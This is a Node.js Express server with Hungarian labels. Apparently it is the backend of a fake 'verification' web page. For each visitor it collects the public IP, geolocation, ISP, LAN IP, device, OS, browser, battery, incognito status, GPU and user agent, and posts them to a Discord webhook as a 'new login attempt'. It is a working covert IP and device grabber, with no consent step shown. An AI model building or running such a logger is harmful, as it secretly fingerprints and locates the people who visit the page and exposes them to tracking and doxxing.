const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();

app.use(cors({
    origin: [
        'https://hitelesites.netlify.app',
        'https://*.netlify.app',
        'http://localhost:3000',
        'http://127.0.0.1:5500',
        'http://localhost:5500'
    ],
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type'],
    optionsSuccessStatus: 204
}));

app.options('*', cors());
app.use(express.json({ limit: '50kb' }));

const WEBHOOK = process.env.DISCORD_WEBHOOK_URL;

const getClientIP = (req) => {
    return (req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip || 'Ismeretlen')
        .split(',')[0].trim();
};

// IP adatok lekérdezése (ország, város, ISP)
async function getIPInfo(ip) {
    try {
        const res = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 4000 });
        return {
            country: `${res.data.country_name || ''}, ${res.data.city || ''}`.trim() || "Ismeretlen",
            isp: res.data.org || res.data.asn || "Ismeretlen",
            hostname: res.data.hostname || "Ismeretlen"
        };
    } catch (e) {
        return { country: "Ismeretlen", isp: "Ismeretlen", hostname: "Ismeretlen" };
    }
}

// ====================== FŐ ENDPOINT ======================
app.post('/hitelesit', async (req, res) => {
    try {
        const data = req.body;
        const publicIP = getClientIP(req);
        const ipInfo = await getIPInfo(publicIP);

        await axios.post(WEBHOOK, {
            embeds: [{
                title: "✅ Új Belépési Kísérlet",
                color: 0x00FF41,
                timestamp: new Date().toISOString(),
                fields: [
                    { name: "Dátum / Idő", value: new Date().toLocaleString('hu-HU', { timeZone: 'Europe/Budapest' }), inline: false },
                    { name: "Publikus IP", value: publicIP, inline: true },
                    { name: "Privát IP (LAN)", value: data.localIP || "Nem található", inline: true },
                    { name: "Ország / Város", value: ipInfo.country, inline: true },
                    { name: "ISP", value: ipInfo.isp, inline: true },
                    { name: "Host Name", value: ipInfo.hostname, inline: false },
                    { name: "Eszköz", value: data.device || "Ismeretlen", inline: true },
                    { name: "Operációs Rendszer", value: data.os || "Ismeretlen", inline: true },
                    { name: "Böngésző", value: data.browser || "Ismeretlen", inline: true },
                    { name: "Képernyő", value: data.screen || "Ismeretlen", inline: true },
                    { name: "Akkumulátor", value: data.battery ? `${data.battery}% ${data.charging ? '(Töltődik)' : ''}` : "N/A", inline: true },
                    { name: "Időzóna", value: data.timezone || "Ismeretlen", inline: true },
                    { name: "Nyelv", value: data.language || "Ismeretlen", inline: true },
                    { name: "Incognito", value: data.incognito ? "Igen" : "Nem", inline: true },
                    { name: "GPU", value: data.gpu || "Nem detektálható", inline: false },
                    { name: "User Agent", value: data.ua ? data.ua.substring(0, 450) + "..." : "Nincs adat", inline: false }
                ]
            }]
        });

        res.status(200).json({ status: "OK" });
    } catch (error) {
        console.error('Webhook hiba:', error.message);
        res.status(500).json({ error: "Szerver hiba" });
    }
});

app.get('/health', (req, res) => res.json({ status: 'OK' }));

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Szerver fut a ${PORT}-es porton`);
});
